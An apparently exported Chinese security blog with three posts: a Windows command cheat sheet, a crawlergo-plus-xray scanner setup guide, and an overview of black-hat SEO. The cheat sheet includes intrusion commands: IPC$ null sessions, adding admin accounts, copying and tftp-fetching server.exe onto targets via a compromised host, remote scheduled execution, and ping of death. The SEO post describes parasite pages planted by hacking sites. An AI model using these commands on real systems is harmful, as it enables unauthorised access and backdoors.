class="number">60</span>.diskmgmt.msc—磁盘管理实用程序</span><br><span class="line"><span class="number">61</span>.dcomcnfg——-打开系统组件服务</span><br><span class="line"><span class="number">62</span>.ddeshare——-打开DDE共享设置</span><br><span class="line"><span class="number">63</span>.osk————打开屏幕键盘</span><br><span class="line"><span class="number">64</span>.odbcad32——-ODBC数据源管理器</span><br><span class="line"><span class="number">65</span>.oobe/msoobe /a—-检查XP是否激活</span><br><span class="line"><span class="number">66</span>.notepad——–打开记事本</span><br><span class="line"><span class="number">67</span>.nslookup——-网络管理的工具向导</span><br><span class="line"><span class="number">68</span>.ntbackup——-系统备份和还原</span><br><span class="line"><span class="number">69</span>.narrator——-屏幕“讲述人”</span><br><span class="line"><span class="number">70</span>.ntmsmgr.msc—-移动存储管理器</span><br><span class="line"><span class="number">71</span>.ntmsoprq.msc—移动存储管理员操作请求</span><br><span class="line"><span class="number">72</span>.netstat -an—-(TC)命令检查接口</span><br><span class="line"><span class="number">73</span>.syncapp——–创建一个公文包</span><br><span class="line"><span class="number">74</span>.sysedit——–系统配置编辑器</span><br><span class="line"><span class="number">75</span>.sigverif——-文件签名验证程序</span><br><span class="line"><span class="number">76</span>.ciadv.msc——索引服务程序</span><br><span class="line"><span class="number">77</span>.shrpubw——–创建共享文件夹</span><br><span class="line"><span class="number">78</span>.secpol.msc—–本地安全策略</span><br><span class="line"><span class="number">79</span>.syskey———系统加密，一旦加密就不能解开，保护windowsxp系统的双重密码</span><br><span class="line"><span class="number">80</span>.services.msc—本地服务设置</span><br><span class="line"><span class="number">81</span>.Sndvol32——-音量控制程序</span><br><span class="line"><span class="number">82</span>.sfc.exe——–系统文件检查器</span><br><span class="line"><span class="number">83</span>.sfc/scannow—windows文件保护</span><br><span class="line"><span class="number">84</span>.ciadv.msc——索引服务程序</span><br><span class="line"><span class="number">85</span>.tourstart——xp简介（安装完成后出现的漫游xp程序）</span><br><span class="line"><span class="number">86</span>.taskmgr——–任务管理器</span><br><span class="line"><span class="number">87</span>.eventvwr——-事件查看器</span><br><span class="line"><span class="number">88</span>.eudcedit——-造字程序</span><br><span class="line"><span class="number">89</span>.compmgmt.msc—计算机管理</span><br><span class="line"><span class="number">90</span>.packager——-对象包装程序</span><br><span class="line"><span class="number">91</span>.perfmon.msc—-计算机性能监测程序</span><br><span class="line"><span class="number">92</span>.charmap——–启动字符映射表</span><br><span class="line"><span class="number">93</span>.cliconfg——-SQLSERVER客户端网络实用程序</span><br><span class="line"><span class="number">94</span>.Clipbrd——–剪贴板查看器</span><br><span class="line"><span class="number">95</span>.conf———–启动netmeeting</span><br><span class="line"><span class="number">96</span>.certmgr.msc—-证书管理实用程序</span><br><span class="line"><span class="number">97</span>.regsvr32 /u *.dll—-停止dll文件运行</span><br><span class="line"><span class="number">98</span>.regsvr32 /u zip fldr.dll——取消ZIP支持</span><br><span class="line"><span class="number">99</span>.<span class="built_in">cmd</span>.exe——–<span class="built_in">CMD</span>命令提示符</span><br><span class="line"><span class="number">100</span>.<span class="built_in">chkdsk</span>.exe—–<span class="built_in">Chkdsk</span>磁盘检查</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">　　<span class="built_in">net</span> use \\ip\ipc$ "" /user:""  建立IPC空链接</span><br><span class="line">　　<span class="built_in">net</span> use ip ipc$ "密码" /user:"用户名"  建立IPC非空链接</span><br><span class="line">　　<span class="built_in">net</span> use h:ipc$"密码"/user:"  用户名"直接登陆后映射对方C：到本地为H:</span><br><span class="line">　　<span class="built_in">net</span> use h:ipc$  登陆后映射对方C：到本地为H:</span><br><span class="line">　　<span class="built_in">net</span> use ip ipc$/<span class="built_in">del</span>  删除IPC链接</span><br><span class="line">　　<span class="built_in">net</span> use h:/<span class="built_in">del</span>  删除映射对方到本地的为H:的映射</span><br><span class="line">　　<span class="built_in">net</span> user 用户名　密码　/add  建立用户</span><br><span class="line">　　<span class="built_in">net</span> user guest /active:yes  激活guest用户</span><br><span class="line">　　<span class="built_in">net</span> user  查看有哪些用户</span><br><span class="line">　　<span class="built_in">net</span> user 帐户  名查看帐户的属性</span><br><span class="line">　　<span class="built_in">net</span> localgroup administrators 用户名 /add    把“用户”添加到管理员中使其具有管理员权限</span><br><span class="line">　　netstart  查看开启了哪些服务</span><br><span class="line">　　netstart 服务名　  开启服务；(如:netstarttelnet，netstartschedule)</span><br><span class="line">　　<span class="built_in">net</span> stop 服务名  停止某服务</span><br><span class="line">　　<span class="built_in">net</span> <span class="built_in">time</span> 目标ip  查看对方时间</span><br><span class="line">　　<span class="built_in">net</span> <span class="built_in">time</span> 目标ip/<span class="built_in">set</span>  设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</span><br><span class="line">　　<span class="built_in">net</span> view  查看本地局域网内开启了哪些共享</span><br><span class="line">　　<span class="built_in">net</span> view ip  查看对方局域网内开启了哪些共享</span><br><span class="line">　　<span class="built_in">net</span> config  显示系统网络设置</span><br><span class="line">　　<span class="built_in">net</span> logoff  断开连接的共享</span><br><span class="line">　　<span class="built_in">net</span> <span class="built_in">pause</span>  服务名暂停某服务</span><br><span class="line">　　<span class="built_in">net</span> send ip "文本信息"  向对方发信息</span><br><span class="line">　　<span class="built_in">net</span> <span class="built_in">ver</span>  局域网内正在使用的网络连接类型和信息</span><br><span class="line">　　<span class="built_in">net</span> share  查看本地开启的共享</span><br><span class="line">　　<span class="built_in">net</span> share ipc$  开启ipc$共享</span><br><span class="line">　　<span class="built_in">net</span> share ipc$ /<span class="built_in">del</span>  删除ipc$共享</span><br><span class="line">　　<span class="built_in">net</span> share c$ /<span class="built_in">del</span>  删除C：共享</span><br><span class="line">　　<span class="built_in">net</span> user guest <span class="number">12345</span>  用guest用户登陆后用将密码改为<span class="number">12345</span></span><br><span class="line">　　<span class="built_in">net</span> password 密码  更改系统登陆密码</span><br><span class="line">　　netstat -a  查看开启了哪些端口,常用netstat -an</span><br><span class="line">　　netstat -n  查看端口的网络连接情况，常用netstat -an</span><br><span class="line">　　netstat -v  查看正在进行的工作</span><br><span class="line">　　netstat -p 协议名   例：netstat -p tcp ip  查看某协议使用情况</span><br><span class="line">　　netstat -s 查看正在使用的所有协议使用情况</span><br><span class="line">　　nbtstat -A ip  对方<span class="number">136</span>到<span class="number">139</span>其中一个端口开了的话，就可查看对方最近登陆的用户名</span><br><span class="line">　　tracert -参数 ip(或计算机名)  跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</span><br><span class="line">　　<span class="built_in">ping</span> ip(或域名)  向对方主机发送默认大小为<span class="number">32</span>字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直<span class="built_in">ping</span>。</span><br><span class="line">　　<span class="built_in">ping</span> -t -l <span class="number">65550</span> ip  死亡之<span class="built_in">ping</span>(发送大于<span class="number">64</span>K的文件并一直<span class="built_in">ping</span>就成了死亡之<span class="built_in">ping</span>)</span><br><span class="line">　　<span class="built_in">ipconfig</span>(winipcfg)  用于windowsNT及XP(windows9598)查看本地ip地址，<span class="built_in">ipconfig</span>可用参数“/all”显示全部配置信息</span><br><span class="line">　　tlist -t  以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</span><br><span class="line">　　kill -F 进程名  加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</span><br><span class="line">　　<span class="built_in">del</span> -F 文件名  加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“<span class="built_in">DEL</span>/AR*.*”表示删除当前目录下所有只读文件，“<span class="built_in">DEL</span>/A-S*.*”表示删除当前目录下除系统文件以外的所有文件</span><br><span class="line">　　<span class="built_in">del</span> /S /Q 目录 或用：<span class="built_in">rmdir</span>/s/Q目录/S删除目录及目录下的所有子目录和文件。同时使用参数/Q可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</span><br><span class="line">　　<span class="built_in">move</span> 盘符路径 要移动的文件名　 存放移动文件的路径移动后文件名移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</span><br><span class="line">　　fc one.txt two.txt&gt;<span class="number">3</span>st.txt对比二个文件并把不同之处输出到<span class="number">3</span>st.txt文件中，"&gt;"和"&gt;&gt;"是重定向命令</span><br><span class="line">　　<span class="built_in">at</span> id号   开启已注册的某个计划任务</span><br><span class="line">　　<span class="built_in">at</span> /delete  停止所有计划任务，用参数/yes则不需要确认就直接停止</span><br><span class="line">　　<span class="built_in">at</span> id号 /delete   停止某个已注册的计划任务</span><br><span class="line">　　<span class="built_in">at</span>  查看所有的计划任务</span><br><span class="line">　　<span class="built_in">at</span> ip <span class="built_in">time</span> 程序名(或一个命令)/r    在某时间运行对方某程序并重新启动计算机</span><br><span class="line">　　finger username@host  查看最近有哪些用户登陆</span><br><span class="line">　　telnet ip端口  远程登陆服务器,默认端口为<span class="number">23</span></span><br><span class="line">　　open ip  连接到IP（属telnet登陆后的命令）</span><br><span class="line">　　telnet  在本机上直接键入telnet将进入本机的telnet</span><br><span class="line">　　<span class="built_in">copy</span>  路径文件名<span class="number">1</span>　路径文件名<span class="number">2</span>/y复制文件<span class="number">1</span>到指定的目录为文件<span class="number">2</span>，用参数/y就同时取消确认你要改写一份现存目录文件</span><br><span class="line">　　<span class="built_in">copy</span> c:srv.exe ip admin$  复制本地c:srv.exe到对方的admin下</span><br><span class="line">　　<span class="built_in">copy</span> <span class="number">1</span>st.jpg/b + <span class="number">2</span>st.txt /a <span class="number">3</span>st.jpg   将<span class="number">2</span>st.txt的内容藏身到<span class="number">1</span>st.jpg中生成<span class="number">3</span>st.jpg新的文件，注：<span class="number">2</span>st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</span><br><span class="line">　　<span class="built_in">copy</span> ip admin$svv.exe c:或: <span class="built_in">copy</span> ip admin$* .*  复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</span><br><span class="line">　　<span class="built_in">xcopy</span> 要复制的文件或目录树 目标地址目录名   复制文件和目录树，用参数/Y将不提示覆盖相同文件</span><br><span class="line">　　用参数/e才可连目录下的子目录一起复制到目标地址下。</span><br><span class="line">　　tftp -i 自己IP(用肉机作跳板时这用肉机IP)  getserver.exec:server.exe登陆后，将“IP”的server.exe下载到目标主机c:server.exe参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i则以ASCII模式（传送文本文件模式）进行传送</span><br><span class="line">　　tftp -i 对方IP　putc:server.exe登陆后，上传本地c:server.exe至主机</span><br><span class="line">　　ftp ip端口  用于上传文件至服务器或进行文件操作，默认端口为<span class="number">21</span>。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</span><br><span class="line">　　route <span class="built_in">print</span>  显示出IP路由，将主要显示网络地址Networkaddres，子网掩码Netmask，网关地址Gatewayaddres，接口地址Interface</span><br><span class="line">　　arp  查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp-a将显示出全部信息</span><br><span class="line">　　<span class="built_in">start</span> 程序名或命令 /max或/min  新开一个新窗口并最大化（最小化）运行某程序或命令</span><br><span class="line">　　mem  查看cpu使用情况</span><br><span class="line">　　<span class="built_in">attrib</span> 文件名(目录名)  查看某文件（目录）的属性</span><br><span class="line">　　<span class="built_in">attrib</span> 文件名-A-R-S-H或+A+R+S+H   去掉(添加)某文件的存档，只读，系统，隐藏属性；用+则是添加为某属性</span><br><span class="line">　　<span class="built_in">dir</span>  查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</span><br><span class="line">　　<span class="built_in">date</span> /t、<span class="built_in">time</span> /t使用此参数即“<span class="built_in">DATE</span> /T”、“<span class="built_in">TIME</span> /T”将只显示当前日期和时间，而不必输入新日期和时间</span><br><span class="line">　　<span class="built_in">set</span> 指定环境变量名称=要指派给变量的字符  设置环境变量</span><br><span class="line">　　<span class="built_in">set</span>  显示当前所有的环境变量</span><br><span class="line">　　setp  (或其它字符)显示出当前以字符p(或其它字符)开头的所有环境变量</span><br><span class="line">　　<span class="built_in">pause</span>  暂停批处理程序，并显示出：请按任意键继续....</span><br><span class="line">　　<span class="keyword">if</span>  在批处理程序中执行条件处理（更多说明见<span class="keyword">if</span>命令及变量）</span><br><span class="line">　　<span class="keyword">goto</span>  标签将<span class="built_in">cmd</span>.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：<span class="built_in">start</span>”标签）</span><br><span class="line">　　<span class="keyword">call</span>  路径批处理文件名从批处理程序中调用另一个批处理程序（更多说明见<span class="keyword">call</span>/?）</span><br><span class="line">　　<span class="keyword">for</span>  对一组文件中的每一个文件执行某个特定命令（更多说明见<span class="keyword">for</span>命令及变量）</span><br><span class="line">　　<span class="built_in">echo</span> on或off  打开或关闭<span class="built_in">echo</span>，仅用<span class="built_in">echo</span>不加参数则显示当前<span class="built_in">echo</span>设置</span><br><span class="line">　　<span class="built_in">echo</span>  信息在屏幕上显示出信息</span><br><span class="line">　　<span class="built_in">echo</span> 信息&gt;&gt;pass.txt  将"信息"保存到pass.txt文件中</span><br><span class="line">　　<span class="built_in">findstr</span>  "Hello"aa.txt在aa.txt文件中寻找字符串hello</span><br><span class="line">　　<span class="built_in">find</span>  文件名查找某文件</span><br><span class="line">　　<span class="built_in">title</span>  标题名字更改<span class="built_in">CMD</span>窗口标题名字</span><br><span class="line">　　<span class="built_in">color</span>  颜色值设置<span class="built_in">cmd</span>控制台前景和背景颜色；<span class="number">0</span>=黑、<span class="number">1</span>=蓝、<span class="number">2</span>=绿、<span class="number">3</span>=浅绿、<span class="number">4</span>=红、<span class="number">5</span>=紫、<span class="number">6</span>=黄、<span class="number">7</span>=白、<span class="number">8</span>=灰、<span class="number">9</span>=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</span><br><span class="line">　　prompt  名称更改<span class="built_in">cmd</span>.exe的显示的命令提示符(把C:、D:统一改为：EntSky)</span><br><span class="line">　　<span class="built_in">ver</span>  在DOS窗口下显示版本信息</span><br><span class="line">　　winver  弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</span><br><span class="line">　　<span class="built_in">format</span> 盘符 /<span class="built_in">FS</span>:类型  格式化磁盘,类型:FAT、FAT32、NTFS,例：<span class="built_in">Format</span> D: /<span class="built_in">FS</span>:NTFS</span><br><span class="line">　　<span class="built_in">md</span>　目录名    创建目录</span><br><span class="line">　　<span class="built_in">replace</span> 源文件　  要替换文件的目录替换文件</span><br><span class="line">　　<span class="built_in">ren</span> 原文件名　 新文件名重命名文件名</span><br><span class="line">　　<span class="built_in">tree</span>  以树形结构显示出目录，用参数-f将列出第个文件夹中文件名称</span><br><span class="line">　　<span class="built_in">type</span>  文件名显示文本文件的内容</span><br><span class="line">　　<span class="built_in">more</span>  文件名逐屏显示输出文件</span><br><span class="line">　　<span class="built_in">doskey</span> 要锁定的命令=字符</span><br><span class="line">　　<span class="built_in">doskey</span> 要解锁命令=  为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定<span class="built_in">dir</span>命令：doskeydir=entsky(不能用doskeydir=<span class="built_in">dir</span>)；解锁：doskeydir=</span><br><span class="line">　　taskmgr  调出任务管理器</span><br><span class="line">　　<span class="built_in">chkdsk</span> /F D:  检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</span><br><span class="line">　　tlntadmntelnt服务admn,键入tlntadmn选择<span class="number">3</span>，再选择<span class="number">8</span>,就可以更改telnet服务默认端口<span class="number">23</span>为其它任何端口</span><br><span class="line">　　<span class="keyword">exit</span>  退出<span class="built_in">cmd</span>.exe程序或目前，用参数/B则是退出当前批处理脚本而不是<span class="built_in">cmd</span>.exe</span><br><span class="line">　　<span class="built_in">path</span>  路径可执行文件的文件名为可执行文件设置一个路径。</span><br><span class="line">　　<span class="built_in">cmd</span>  启动一个win2K命令解释窗口。参数：/eff、/en关闭、开启命令扩展；更我详细说明见<span class="built_in">cmd</span> /?</span><br><span class="line">　　regedit /s 注册表文件名   导入注册表；参数/S指安静模式导入，无任何提示；</span><br><span class="line">　　regedit /e 注册表文件名   导出注册表</span><br><span class="line">  </span><br><span class="line">　　<span class="built_in">cacls</span> 文件名　</span><br><span class="line">  参数显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D用户名:设定拒绝某用户访问；/P用户名:perm替换指定用户的访问权限；/G用户名:perm赋予指定用户访问权限；Perm可以是:N无，R读取，W写入，C更改(写入)，F完全控制；例：caclsD:est.txt/Dpub设定d:est.txt拒绝pub用户访问。</span><br><span class="line">  </span><br><span class="line">　　<span class="built_in">cacls</span> 文件名  查看文件的访问用户权限列表</span><br><span class="line"><span class="comment">　　REM 文本内容  在批处理文件中添加注解</span></span><br><span class="line">　　netsh  查看或更改本地网络配置情况</span><br></pre></td></tr></tbody></table></figure><p>参考：</p><p><a href="https://www.cnblogs.com/1-Ry/p/15156357.html">https://www.cnblogs.com/1-Ry/p/15156357.html</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/10899119.html">https://www.cnblogs.com/hookjoy/p/10899119.html</a></p><p>GFinger的windows信息收集</p><p>部分资料网络google与百度，参考资料作者来源不详</p>]]></content>
      
      
      <categories>
          
          <category> windows命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 命令 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crawlergo-to-xray(server酱推送微信)</title>
      <link href="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/"/>
      <url>/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="crawlergo-to-xray（server酱推送微信）"><a href="#crawlergo-to-xray（server酱推送微信）" class="headerlink" title="crawlergo-to-xray（server酱推送微信）"></a>crawlergo-to-xray（server酱推送微信）</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li><p>debian系liunx(kali)</p></li><li><p>python3.8（3.7以上）</p></li><li><p><a href="https://gitee.com/ty001007/crawlergo-to-xray">crawlergo-to-xray</a></p></li><li><p><a href="https://github.com/chaitin/xray">xray(linux)</a></p></li><li><p><a href="https://github.com/Qianlitp/crawlergo/releases">crawlergo</a></p></li><li><p><a href="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb">chrome(linux)</a></p></li><li><p><a href="https://sct.ftqq.com/sendkey">server酱</a></p></li></ul><h2 id="配置server"><a href="#配置server" class="headerlink" title="配置server"></a>配置server</h2><ol><li><p>扫码关注同时即可完成绑定<br><a href="https://sct.ftqq.com/">https://sct.ftqq.com/</a><br><img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/8b561a65bcad45059d8871fcb47e9240.png"></p></li><li><p>给webhook.py配置api</p><p><img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/5249bc2bfc6a4218bd4b77f7fe692f81.png"><br>替换相应的参数<br><img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/c6c22de5a49b4375859b4c7ecba27220.png"></p></li><li><p>运行<br>python3 webhook.py<br><img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/81933f2391394fd69ba99738ba50ff40.png"></p></li></ol><h2 id="配置xray"><a href="#配置xray" class="headerlink" title="配置xray"></a>配置xray</h2><ol><li>初始配置，生成证书，配置config，给权限</li></ol><figure class="highlight gcode"><table><tbody><tr><td class="code"><pre><span class="line">chmod +x  xray_li<span class="symbol">nux_amd64</span></span><br><span class="line"> ./xray_li<span class="symbol">nux_amd64</span>  <span class="keyword">ge</span><span class="symbol">nca</span></span><br></pre></td></tr></tbody></table></figure><p> <strong>配置config.yaml</strong><br> 这里主要配置认证登录的username以及password和cookie值，针对登录系统爬虫。<br> <img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/64e92c78bc2e4781898d25dd274033aa.png"><br> 设置自己浏览器中ua头<br> <img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/Piggo\img\a106fd36a3c64786805e8f1e9b4ed254-1635437057281.png"></p><ol start="2"><li>启动xray并查看日志（需要自行修改xray的配置文件以及命令行中的的配置，建议在xray里面配置username和password，以及[xray_port和webhook_port端口）<br><code>./xray_linux_amd64 webscan --listen  127.0.0.1:7777 --webhook-output  http://127.0.0.1:5000/webhook    --html-output xray.html</code><br>  <img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/bcfd8801cdd54a49af5080d364499f3c.png"></li></ol><h2 id="kali安装chrome"><a href="#kali安装chrome" class="headerlink" title="kali安装chrome"></a>kali安装chrome</h2><ol><li>下载安装包</li></ol><p><code>root@kali:~# wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</code></p><ol start="2"><li>安装（如果提示报错，执行第三步处理依赖关系。）</li></ol><p><code>root@kali:~# dpkg -i google-chrome-stable_current_amd64.deb</code></p><ol start="3"><li> 解决依赖关系</li></ol><p><code>root@kali:~# apt-get -f install</code></p><ol start="4"><li>安装依赖包</li></ol><p><code>root@kali:~# apt-get install google-chrome-stable</code></p><ol start="5"><li>查看目录<br><code>which google-chrome-stable</code></li></ol><p>可参考网上其它安装方法</p><h2 id="配置crawlergo"><a href="#配置crawlergo" class="headerlink" title="配置crawlergo"></a>配置crawlergo</h2><ol><li>修改chorme的路径地址以及代理IP地址<br>如果需要更准确的爬虫，需要设置cookie和user-agent信息以及加上代理的ip和用户名和密码,cookieh和user-agent值可以通过登录系统后,xyay的代理IP和用户名和密码，可以根据前面设置的xray的配置获得。<br>抓包获取</li></ol><figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">./crawlergo<span class="string">", "</span>-<span class="keyword">c</span><span class="string">", "</span>/usr/bin/google-chrome<span class="string">","</span>-t<span class="string">", "</span><span class="number">10</span><span class="string">","</span>-<span class="keyword">f</span><span class="string">","</span>smart<span class="string">","</span>--fuzz-path<span class="string">", "</span>--output-<span class="keyword">mode</span><span class="string">", "</span>json<span class="string">","</span>--ignore-url-keywords<span class="string">", "</span><span class="keyword">quit</span>,<span class="keyword">exit</span>,logout<span class="string">", "</span>--custom-headers<span class="string">", simplejson.dumps(headers),"</span>--robots-path<span class="string">","</span>--<span class="built_in">log</span>-level<span class="string">","</span><span class="keyword">debug</span><span class="string">","</span>--push-<span class="keyword">to</span>-proxy<span class="string">","</span>http://xray_username:xray_password@xray_ip:xray_port<span class="comment">",target</span></span><br><span class="line">以及</span><br><span class="line">headers = {</span><br><span class="line">                <span class="string">"User-Agent"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="string">"Cookie"</span>: <span class="string">""</span></span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure><p><img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/b2d46c43ae85405abaedad17deae0748.png"></p><ol start="2"><li>运行<br><code>chmod +x  crawlergo</code><br>写入自己要扫的域名<br><code>vi targets.txt</code><br>运行<br><code>python3 crawlergo.py</code><br><img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/8b561a65bcad45059d8871fcb47e9240.png"></li></ol><h2 id="微信端查看到漏洞情况"><a href="#微信端查看到漏洞情况" class="headerlink" title="微信端查看到漏洞情况"></a>微信端查看到漏洞情况</h2><p><strong>免费用户每天只有五次免费</strong><br><img src="/2021/10/28/crawlergo-to-xray-server%E9%85%B1%E6%8E%A8%E9%80%81%E5%BE%AE%E4%BF%A1/152157b878c045338b3ff6ea5ada8815.png"></p><p><strong>可以用nohup命令后台运行并日志保存</strong><br>nohup python3 webhook.py &gt; webhook.log 2&gt;&amp;1 &amp;<br> nohup python3 crawlergo.py &gt; crawlergo.log 2&gt;&amp;1 &amp;<br> nohup ./xray_linux_amd64 webscan –listen  127.0.0.1:7777 –webhook-output  <a href="http://127.0.0.1:5000/webhook">http://127.0.0.1:5000/webhook</a>    –html-output xray.html &gt; xray.log 2&gt;&amp;1 &amp;</p><p><strong>参考</strong>：<br><a href="https://www.cnblogs.com/backlion/p/14288456.html">https://www.cnblogs.com/backlion/p/14288456.html</a></p><p><a href="https://gitee.com/ty001007/crawlergo-to-xray/b2d46c43ae85405abaedad17deae0748.png">https://gitee.com/ty001007/crawlergo-to-xray/b2d46c43ae85405abaedad17deae0748.png</a>)</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 扫描器 </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑帽SEO</title>
      <link href="/2021/09/14/%E9%BB%91%E5%B8%BDSEO/"/>
      <url>/2021/09/14/%E9%BB%91%E5%B8%BDSEO/</url>
      
        <content type="html"><![CDATA[<h2 id="黑帽SEO作弊手法"><a href="#黑帽SEO作弊手法" class="headerlink" title="黑帽SEO作弊手法"></a>黑帽SEO作弊手法</h2><h3 id="泛站群"><a href="#泛站群" class="headerlink" title="泛站群"></a>泛站群</h3><p>泛二级域名站群</p><p><strong>站群</strong>:</p><p>着很多的网址，这种网址全是单独的域名构成，用很多的单独域名制成一个网站集群服务器。一般实际操作手法游动在白帽SEO和灰帽SEO中间。</p><p><strong>泛站群</strong>:</p><p>就是说用一个顶级域名*.域名泛分析开展转化成很多的二级域名。随后二级域名大批量的转化成很多网址，产生站群。泛站群一般是垃圾站的代称，这类手法基础已被搜索引擎判断为黑帽SEO，是搜索引擎重点严厉打击对象，可是许多黑帽SEO以便避开搜索引擎优化算法提升网站排名，泛站群的手法也在不断拆换。</p><p>泛站群的归类</p><p>　　泛站群的普遍手法关键是两大类：二级域泛站群和二级目录泛站群。由于二级域泛站群早已变成过街老鼠，被搜索引擎各种各样严厉打击，现阶段做二级域泛站群也越来越低，许多黑帽SEO继而做二级目录泛站群，相比二级域泛站群，二级目录泛站群关键存有下列一些优点：</p><p>　　1.承继一部分主页权重值，提升网址的百度收录量;</p><p>　　2.二级目录泛站群网页页面能够相互之间做反链进而提高主页权重值。</p><p>不论是做二级域泛站群還是二级目录泛站群，最先要提前准备的是域名和一个大容量，随后去在网上免费下载站群程序流程，如黑侠站群、蜘蛛侠站群、豪侠站群等手机软件，把站群程序流程上传入室内空间；随后提前准备很多的长尾词，在程序流程里边设计方案好，程序流程会全自动爬取这种关键字开展配对，类似一些群发软件实际操作上并不会太难。</p><p><img src="https://tse4-mm.cn.bing.net/th/id/OIP-C.Q6jby9BlnuYxn_Vaf14YJgHaE8?pid=ImgDet&amp;rs=1" alt="查看源图像"></p><p> Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。</p><h3 id="蜘蛛池"><a href="#蜘蛛池" class="headerlink" title="蜘蛛池"></a>蜘蛛池</h3><p> 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。</p><h3 id="寄生虫"><a href="#寄生虫" class="headerlink" title="寄生虫"></a>寄生虫</h3><p> 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。</p><p>SEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。</p><h3 id="PR劫持"><a href="#PR劫持" class="headerlink" title="PR劫持"></a>PR劫持</h3><p> 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。</p><p> 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。</p><p>判断：</p><p>通过查看Google的网页快照对比区别</p><h3 id="隐藏页面"><a href="#隐藏页面" class="headerlink" title="隐藏页面"></a>隐藏页面</h3><p>隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。</p><p>判断：</p><p>1.访问网站时改变浏览器的用户代理（user-agent）,将自己的浏览器伪装成搜索引擎蜘蛛。火狐插件可实现。</p><p>2.看网页在搜索引擎中的快照</p><p>隐藏页面与正常的IP传送（IP 